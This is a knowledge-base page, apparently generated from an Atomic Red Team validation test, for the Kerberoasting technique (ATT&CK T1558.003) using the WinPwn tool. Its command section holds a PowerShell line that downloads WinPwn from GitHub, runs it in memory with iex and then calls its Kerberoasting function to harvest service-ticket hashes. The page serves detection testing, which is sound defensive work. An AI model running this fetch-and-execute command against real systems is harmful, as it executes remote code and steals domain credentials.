---
atomic_guid: "78d10e20-c874-45f2-a9df-6fea0120ec27"
title: "WinPwn - Kerberoasting"
framework: "atomic"
generated: "true"
attack_technique_id: "T1558.003"
attack_technique_name: "Steal or Forge Kerberos Tickets: Kerberoasting"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1558.003/T1558.003.yaml"
build_date: "2026-04-26 17:02:13"
executor: "powershell"
aliases:
  - "78d10e20-c874-45f2-a9df-6fea0120ec27"
  - "WinPwn - Kerberoasting"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[workspaces/index|Notes]]

# WinPwn - Kerberoasting

Kerberoasting technique via function of WinPwn

## Metadata

- Atomic GUID: 78d10e20-c874-45f2-a9df-6fea0120ec27
- Technique: T1558.003: Steal or Forge Kerberos Tickets: Kerberoasting
- Platforms: windows
- Executor: powershell
- Source Path: atomics/T1558.003/T1558.003.yaml

## ATT&CK Mapping

- [[kb/attack/techniques/T1558-steal_or_forge_kerberos_tickets|T1558.003]]

## Executor

- name: powershell

### Command

```powershell
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
Kerberoasting -consoleoutput -noninteractive
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1558.003/T1558.003.yaml)
